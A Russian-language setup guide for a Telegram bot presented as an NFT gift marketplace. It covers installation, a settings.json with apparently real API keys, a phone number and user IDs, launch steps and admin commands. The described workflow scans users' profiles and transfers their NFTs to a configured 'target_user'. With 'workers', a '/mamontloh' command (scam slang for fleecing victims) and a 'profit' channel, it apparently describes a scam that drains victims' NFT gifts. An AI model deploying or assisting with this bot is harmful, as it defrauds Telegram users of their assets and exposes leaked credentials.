# 🚀 ЗАПУСК БОТА - ПОЛНОЕ РУКОВОДСТВО ДЛЯ НОВИЧКОВ

**Это всё что нужно знать чтобы запустить бота с нуля!**

---

## 📋 ОГЛАВЛЕНИЕ

1. [Требования](#требования)
2. [Установка](#установка)
3. [Настройка](#настройка)
4. [Запуск](#запуск)
5. [Использование](#использование)
6. [Что делает бот](#что-делает-бот)
7. [Troubleshooting](#troubleshooting)

---

## 📦 Требования

- **Python 3.9+**
- **pip** (менеджер пакетов Python)
- **Telegram аккаунт** (для создания бота и получения ключей)
- **Git** (опционально, для клонирования репозитория)

**Проверка установки:**
```powershell
python --version
pip --version
```

---

## 🔧 Установка

### Шаг 1: Клонируй или скачай проект
```powershell
# Перейди в папку проекта
cd c:\Users\[YourUsername]\Desktop\rew
```

### Шаг 2: Создай виртуальное окружение
```powershell
# Создай виртуальное окружение
python -m venv venv

# Активируй его (Windows)
.\venv\Scripts\activate

# После активации видишь (venv) в начале строки
```

### Шаг 3: Установи зависимости
```powershell
pip install -r scripts/requirements.txt
```

**Что устанавливается:**
- `aiogram` - фреймворк для Telegram бота
- `pyrogram` - библиотека для работы с Telegram API
- `aiohttp` - асинхронные HTTP запросы
- `python-dotenv` - управление переменными окружения

---

## ⚙️ Настройка

### Шаг 1: Получи API ключи от Telegram

1. Открой https://my.telegram.org/apps
2. Создай новое приложение (fill the form)
3. **Сохрани:**
   - **API ID** (число)
   - **API Hash** (длинная строка)

### Шаг 2: Создай бота через BotFather

1. Напиши в Telegram: `@BotFather`
2. Команда: `/newbot`
3. Дай имя боту (напр. `MyNFTBot`)
4. Получишь **BOT_TOKEN** (начинается с цифр и содержит `:`)

### Шаг 3: Отредактируй `settings.json`

Файл находится в: `c:\Users\[YourUsername]\Desktop\rew\scripts\settings.json`

```json
{
  "bot_token": "123456789:ABCDefGHIjKLMnoPQrStUVwXyZ1234567890",
  "api_id": 27696098,
  "api_hash": "3db5afb9bb9af6a86fc47056c0d3f728",
  "api_url": "https://marketplace-bot.vercel.app/",
  "admin_ids": [685367460],
  "workers": [685367460, 8201216262],
  "target_user": "@prizgps",
  
  "gift_account_phone": 12722287659,
  "gift_account_api_id": 27696098,
  "gift_account_api_hash": "3db5afb9bb9af6a86fc47056c0d3f728",
  
  "maintenance_mode": false,
  "profit_channel_id": -1003507402205,
  "logs_channel_id": -1003415153709
}
```

**Что заполнить:**
- `bot_token` - токен от BotFather
- `api_id` - API ID из my.telegram.org
- `api_hash` - API Hash из my.telegram.org
- `admin_ids` - твой Telegram ID (узнай через `@userinfobot`)
- `gift_account_phone` - номер телефона для подарочного аккаунта
- `target_user` - кому передавать NFT (юзернейм или ID)
- `profit_channel_id` - ID канала для логов (опционально)
- `logs_channel_id` - ID канала для логов (опционально)

---

## 🚀 Запуск

### Способ 1: Прямой запуск (Windows)

```powershell
cd c:\Users\[YourUsername]\Desktop\rew\scripts
python main3.py
```

### Способ 2: Через батник (один клик)

```powershell
# Просто дважды кликни на файл: start.bat
# Или запусти:
c:\Users\[YourUsername]\Desktop\rew\scripts\start.bat
```

### Если всё правильно:

```
💎 UNIFIED MARKETPLACE BOT v5.0 STARTED
🔗 API URL: https://marketplace-bot.vercel.app/
👷 Workers: 2
🎯 Target: @prizgps
```

**Бот успешно запущен!** 🎉

---

## 💬 Использование

### Как пользователь:

1. **Напиши боту:** `/start`
2. Выбери язык (EN / RU)
3. Открой маркетплейс через кнопку "Open App"
4. Получай NFT подарки!

### Как админ/воркер:

**Команды:**
- `/admin` - админ панель
- `/mamontloh` - активировать воркер режим
- `/pyid @username сообщение` - отправить сообщение через бота

**Инлайн режим:** (напиши в любом чате)
- `@YourBotName🎁` - создать подарочную ссылку

---

## 🎯 Что делает бот

### Основной функционал:

1. **NFT Передача** 📤
   - Сканирует NFT в профиле пользователя
   - Рассчитывает стоимость (25⭐ за NFT)
   - Проверяет баланс звезд
   - Если баланса не хватает → продает обычные подарки
   - Если ещё не хватает → получает подарки от подарочного аккаунта
   - После передачи → покупает бонус-подарки на остаток (760⭐ стратегия)

2. **Подарки** 🎁
   - Получение подарков через ссылку
   - Автоматическая передача NFT при получении
   - Логирование всех операций

3. **Админ панель** 👑
   - Управление воркерами
   - Просмотр статистики
   - Проверка банкера (gift аккаунта)
   - Изменение целевого пользователя

### Процесс передачи NFT (автоматический):

```
1️⃣ Сканирование профиля
   ↓
2️⃣ Расчет стоимости (количество NFT × 25⭐)
   ↓
3️⃣ Проверка баланса
   ├─ ДОСТАТОЧНО → передать NFT ✅
   └─ НЕ ХВАТАЕТ → продать подарки
      ↓
4️⃣ Если всё ещё мало → получить подарки от gift аккаунта
   ↓
5️⃣ Передача NFT ✅
   ↓
6️⃣ На остаток баланса купить подарки
   └─ 760⭐ = 7×100⭐ + 4×15⭐
```

---

## 🐛 Troubleshooting

### ❌ "Telegram server says - Bad Request: message text is empty"

**Решение:** Перезапусти бота
```powershell
# Стоп бота (Ctrl+C в терминале)
# Новый запуск:
python main3.py
```

### ❌ "ModuleNotFoundError: No module named 'pyrogram'"

**Решение:** Установи зависимости
```powershell
pip install -r scripts/requirements.txt
```

### ❌ "API ID invalid"

**Решение:** Проверь `settings.json`
- API ID должен быть **числом**
- API Hash должна быть **строка**

### ❌ "[401 AUTH_KEY_UNREGISTERED]"

**Решение:** Сессия устарела, нужна переавторизация
- Удали файлы `*.session` в папке `scripts/`
- Перезапусти бота

### ❌ Бот не отвечает на сообщения

**Проверка:**
1. Бот активен? (видишь логи в терминале)
2. BOT_TOKEN правильный? (проверь в settings.json)
3. Бот добавлен в группу? (если используешь в группе)

---

## 📞 Помощь

**Если что-то не работает:**

1. **Проверь логи** - в терминале видны ошибки
2. **Перезапусти бота** - часто помогает
3. **Удали .session файлы** - могут быть повреждены
4. **Проверь settings.json** - все ли ключи заполнены

**Важные файлы:**
- `main3.py` - основной бот
- `settings.json` - конфигурация
- `unified_bot.db` - база данных пользователей
- `sessions/` - папка с сессиями Telegram

---

## 📊 Структура проекта

```
rew/
├── scripts/
│   ├── main3.py              ← ОСНОВНОЙ БОТ
│   ├── settings.json         ← НАСТРОЙКИ
│   ├── requirements.txt       ← ЗАВИСИМОСТИ
│   ├── unified_bot.db        ← БАЗА ДАННЫХ
│   ├── sessions/             ← СЕССИИ TELEGRAM
│   └── start.bat             ← ЗАПУСК (Windows)
├── docs/
│   └── README_START_HERE.md  ← ТЫ ЗДЕСЬ
├── app/                      ← REST API (NextJS)
├── components/               ← UI компоненты
└── public/                   ← Статические файлы
```

---

## ✅ Чек-лист для первого запуска

- [ ] Python 3.9+ установлен
- [ ] Виртуальное окружение активно (`(venv)` в консоли)
- [ ] Зависимости установлены (`pip install -r requirements.txt`)
- [ ] API ID и API Hash получены с my.telegram.org
- [ ] BOT_TOKEN получен от @BotFather
- [ ] settings.json заполнен правильно
- [ ] Бот запущен: `python main3.py`
- [ ] Видишь сообщение "UNIFIED MARKETPLACE BOT v5.0 STARTED"
- [ ] Напиши боту `/start` и получил ответ

**Если всё зелено ✅ - ты готов к работе!**

---

## 🎉 Поздравляем!

Ты успешно запустил NFT маркетплейс бота!

**Следующие шаги:**
1. Пригласи пользователей в бот
2. Воркеры создают подарочные ссылки через инлайн
3. Пользователи получают NFT автоматически
4. Админ отслеживает всё через админ панель

**Удачи! 🚀**
